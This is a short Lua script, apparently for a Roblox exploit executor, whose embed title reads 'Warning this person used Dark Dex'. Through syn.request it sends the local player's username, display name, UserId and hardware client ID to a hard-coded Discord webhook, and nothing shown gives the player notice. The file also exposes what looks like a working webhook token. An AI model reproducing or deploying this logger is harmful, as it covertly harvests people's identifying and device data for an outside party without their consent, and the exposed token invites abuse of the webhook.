local h = game.HttpService
local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"

local responce = syn.request(
{
   Url = webUrl,
   Method = "POST",
   Headers = {
       ['Content-Type'] = 'application/json'
   },
   Body = h:JSONEncode({
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**Warning this person used Dark Dex**",
           ["description"] = "User: "..game.Players.LocalPlayer.Name.." or Display: "..game.Players.LocalPlayer.DisplayName.." UserId: "..game.Players.LocalPlayer.UserId,
           ["type"] = "rich",
           ["color"] = tonumber(0xd40e0e),
           ["fields"] = {
               {
                   ["name"] = "Hardware ID:",
                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                   ["inline"] = true
               }
           }
           
       }}
   })
})
